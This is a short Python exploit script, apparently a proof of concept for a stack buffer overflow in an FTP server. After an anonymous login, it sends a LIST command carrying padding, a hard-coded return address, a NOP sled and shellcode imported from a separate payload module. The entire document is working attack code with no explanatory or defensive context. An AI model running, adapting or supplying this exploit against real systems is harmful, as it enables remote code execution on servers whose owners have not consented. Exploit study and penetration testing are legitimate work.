#!/usr/bin/python
import socket,sys,time,os
from payload import buf
import socket
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):

    target = target_machine
    port = target_port
    
    junk = b"\x41" * 246
    add = pack(b'<L',0x77c35459)
    nops = b"\x90" * 20
    
    payload = junk+add+nops+buf
    
   
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
       s.connect((target, port))
      
    except:
        
        sys.exit(0)
    
    s.recv(1024)
    

    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASS anonymous\r\n')
    s.recv(1024)
   
    s.send(b'LIST ' + payload + b'\r\n')
    s.recv(1024)
    
   
    
    try:
        s.recv(1024)
       
    
    except:
        pass
    
    s.close()